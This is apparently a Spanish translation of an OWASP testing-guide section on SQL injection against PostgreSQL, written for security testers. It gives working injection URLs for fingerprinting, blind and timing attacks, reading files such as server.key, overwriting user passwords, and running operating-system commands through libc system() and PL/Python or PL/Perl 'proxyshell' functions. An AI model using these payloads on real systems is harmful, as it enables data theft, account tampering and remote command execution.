# Pruebas de PostgreSQL

## Resumen

En esta sección, se discutirán algunas técnicas de inyección SQL para PostgreSQL. Estas técnicas tienen las siguientes características:

- El conector PHP permite ejecutar múltiples declaraciones utilizando `;` como separador de declaraciones
- Las declaraciones SQL pueden truncarse añadiendo el carácter de comentario: `--`.
- `LIMIT` y `OFFSET` pueden utilizarse en una declaración `SELECT` para recuperar una porción del conjunto de resultados generado por la consulta

A partir de ahora se asume que `https://www.example.com/news.php?id=1` es vulnerable a ataques de inyección SQL.

## Cómo probar

### Identificar PostgreSQL

Cuando se ha encontrado una inyección SQL, es necesario identificar cuidadosamente el motor de base de datos backend. Puede determinarse que el motor de base de datos backend es PostgreSQL utilizando el operador de conversión *::*.

#### Ejemplos

`https://www.example.com/store.php?id=1 AND 1::int=1`

Además, la función *version()* puede utilizarse para obtener el banner de PostgreSQL. Esto también mostrará el tipo y versión del sistema operativo subyacente.

##### Ejemplo

`https://www.example.com/store.php?id=1 UNION ALL SELECT NULL,version(),NULL LIMIT 1 OFFSET 1--`

Un ejemplo de cadena de banner que podría devolverse es:

`PostgreSQL 8.3.1 on i486-pc-linux-gnu, compiled by GCC cc (GCC) 4.2.3 (Ubuntu 4.2.3-2ubuntu4)`

### Inyección ciega

Para ataques de inyección SQL ciega, se deben considerar las siguientes funciones integradas:

- Longitud de cadena
`LENGTH(str)`

- Extraer una subcadena de una cadena dada
`SUBSTR(str,index,offset)`

- Representación de cadena sin comillas simples
`CHR(104)||CHR(101)||CHR(108)||CHR(108)||CHR(111)`

A partir de la versión 8.2, PostgreSQL introdujo una función integrada, `pg_sleep(n)`, para hacer que el proceso de sesión actual duerma durante `n` segundos. Esta función puede aprovecharse para ejecutar ataques de temporización (discutidos en detalle en [Inyección SQL ciega](https://owasp.org/www-community/attacks/Blind_SQL_Injection)).

Además, puede crearse fácilmente un `pg_sleep(n)` personalizado en versiones anteriores utilizando libc:

- `CREATE function pg_sleep(int) RETURNS int AS '/lib/libc.so.6', 'sleep' LANGUAGE 'C' STRICT`

### Escape de comilla simple

Las cadenas pueden codificarse, para prevenir el escape de comillas simples, utilizando la función `chr()`.

- `chr(n)`: Devuelve el carácter cuyo valor ASCII corresponde al número `n`
- `ascii(n)`: Devuelve el valor ASCII que corresponde al carácter `n`

Digamos que quieres codificar la cadena 'root':

```sql
select ascii('r')
114
select ascii('o')
111
select ascii('t')
116
```

Podemos codificar 'root' como:

`chr(114)||chr(111)||chr(111)||chr(116)`

#### Ejemplo

`https://www.example.com/store.php?id=1; UPDATE users SET PASSWORD=chr(114)||chr(111)||chr(111)||chr(116)--`

### Vectores de ataque

#### Usuario actual

La identidad del usuario actual puede recuperarse con las siguientes declaraciones SELECT SQL:

```sql
SELECT user
SELECT current_user
SELECT session_user
SELECT usename FROM pg_user
SELECT getpgusername()
```

##### Ejemplo

```text
https://www.example.com/store.php?id=1 UNION ALL SELECT user,NULL,NULL--
https://www.example.com/store.php?id=1 UNION ALL SELECT current_user, NULL, NULL--
```

#### Base de datos actual

La función integrada current\_database() devuelve el nombre de la base de datos actual.

##### Ejemplo

`https://www.example.com/store.php?id=1 UNION ALL SELECT current_database(),NULL,NULL--`

#### Leer desde un archivo

PostgreSQL proporciona dos formas de acceder a un archivo local:

- Declaración `COPY`
- Función interna `pg_read_file()` (a partir de PostgreSQL 8.1)

##### COPY

Este operador copia datos entre un archivo y una tabla. El motor PostgreSQL accede al sistema de archivos local como el usuario `postgres`.

###### Ejemplo

```text
/store.php?id=1; CREATE TABLE file_store(id serial, data text)--
/store.php?id=1; COPY file_store(data) FROM '/var/lib/postgresql/.psql_history'--
```

Los datos deben recuperarse realizando una `Inyección SQL de consulta UNION`:

- recupera el número de filas añadidas previamente en `file_store` con la declaración `COPY`
- recupera una fila a la vez con inyección SQL UNION

```text
/store.php?id=1 UNION ALL SELECT NULL, NULL, max(id)::text FROM file_store LIMIT 1 OFFSET 1;--
/store.php?id=1 UNION ALL SELECT data, NULL, NULL FROM file_store LIMIT 1 OFFSET 1;--
/store.php?id=1 UNION ALL SELECT data, NULL, NULL FROM file_store LIMIT 1 OFFSET 2;--
...
...
/store.php?id=1 UNION ALL SELECT data, NULL, NULL FROM file_store LIMIT 1 OFFSET 11;--
```

##### pg_read_file()

Esta función se introdujo en `PostgreSQL 8.1` y permite leer archivos arbitrarios ubicados dentro del directorio de datos del DBMS.

###### Ejemplo

`SELECT pg_read_file('server.key',0,1000);`

#### Escribir a un archivo

Revirtiendo la declaración COPY, podemos escribir en el sistema de archivos local con los derechos del usuario `postgres`

`/store.php?id=1; COPY file_store(data) TO '/var/lib/postgresql/copy_output'--`

#### Inyección de shell

PostgreSQL proporciona un mecanismo para añadir funciones personalizadas utilizando tanto bibliotecas dinámicas como lenguajes de scripting como python, perl y tcl.

##### Biblioteca dinámica

Hasta PostgreSQL 8.1, era posible añadir una función personalizada vinculada con `libc`:

`CREATE FUNCTION system(cstring) RETURNS int AS '/lib/libc.so.6', 'system' LANGUAGE 'C' STRICT`

Dado que `system` devuelve un `int` ¿cómo podemos obtener resultados de la salida estándar de `system`?

Aquí hay un pequeño truco:

- crear una tabla `stdout`: `CREATE TABLE stdout(id serial, system_out text)`
- ejecutar un comando shell redirigiendo su `stdout`: `SELECT system('uname -a > /tmp/test')`
- utilizar declaraciones `COPY` para empujar la salida del comando anterior en la tabla `stdout`: `COPY stdout(system_out) FROM '/tmp/test*'`
- recuperar salida de `stdout`: `SELECT system_out FROM stdout`

###### Ejemplo

```text
/store.php?id=1; CREATE TABLE stdout(id serial, system_out text) --
/store.php?id=1; CREATE FUNCTION system(cstring) RETURNS int AS '/lib/libc.so.6','system' LANGUAGE 'C'
STRICT --
/store.php?id=1; SELECT system('uname -a > /tmp/test') --
/store.php?id=1; COPY stdout(system_out) FROM '/tmp/test' --
/store.php?id=1 UNION ALL SELECT NULL,(SELECT system_out FROM stdout ORDER BY id DESC),NULL LIMIT 1 OFFSET 1--
```

##### Plpython

PL/Python permite a los usuarios codificar funciones PostgreSQL en python. Es no confiable, por lo que no hay forma de restringir lo que el usuario puede hacer. No está instalado por defecto y puede habilitarse en una base de datos dada por `CREATELANG`

- Verificar si PL/Python ha sido habilitado en una base de datos: `SELECT count(*) FROM pg_language WHERE lanname='plpythonu'`
- Si no, intentar habilitar: `CREATE LANGUAGE plpythonu`
- Si cualquiera de los anteriores tuvo éxito, crear una función proxy shell: `CREATE FUNCTION proxyshell(text) RETURNS text AS 'import os; return os.popen(args[0]).read() 'LANGUAGE plpythonu`
- Diviértete con: `SELECT proxyshell(comando os);`

###### Ejemplo

- Crear una función proxy shell: `/store.php?id=1; CREATE FUNCTION proxyshell(text) RETURNS text AS 'import os;return os.popen(args[0]).read()' LANGUAGE plpythonu;--`
- Ejecutar un comando OS: `/store.php?id=1 UNION ALL SELECT NULL, proxyshell('whoami'), NULL OFFSET 1;--`

##### Plperl

Plperl nos permite codificar funciones PostgreSQL en perl. Normalmente, se instala como un lenguaje confiable para deshabilitar la ejecución en tiempo de ejecución de operaciones que interactúan con el sistema operativo subyacente, como `open`. Al hacerlo, es imposible obtener acceso a nivel de OS. Para inyectar exitosamente una función como proxyshell, necesitamos instalar la versión no confiable desde el usuario `postgres`, para evitar el llamado filtrado de máscara de aplicación de operaciones confiables/no confiables.

- Verificar si PL/perl-no confiable ha sido habilitado: `SELECT count(*) FROM pg_language WHERE lanname='plperlu'`
- Si no, asumiendo que sysadm ya ha instalado el paquete plperl, intentar: `CREATE LANGUAGE plperlu`
- Si cualquiera de los anteriores tuvo éxito, crear una función proxy shell: `CREATE FUNCTION proxyshell(text) RETURNS text AS 'open(FD,"$_[0] |");return join("",<FD>);' LANGUAGE plperlu`
- Diviértete con: `SELECT proxyshell(comando os);`

###### Ejemplo

- Crear una función proxy shell: `/store.php?id=1; CREATE FUNCTION proxyshell(text) RETURNS text AS 'open(FD,"$_[0] |");return join("",<FD>);' LANGUAGE plperlu;`
- Ejecutar un comando OS: `/store.php?id=1 UNION ALL SELECT NULL, proxyshell('whoami'), NULL OFFSET 1;--`

## Referencias

- [Pruebas de inyección SQL](05-Testing_for_SQL_Injection.md)
- [Hoja de referencia para prevención de inyección SQL](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [Documentación oficial de PostgreSQL](https://www.postgresql.org/docs/)
- [Bernardo Damele y Daniele Bellucci: sqlmap, una herramienta de inyección SQL ciega](https://sqlmap.org/)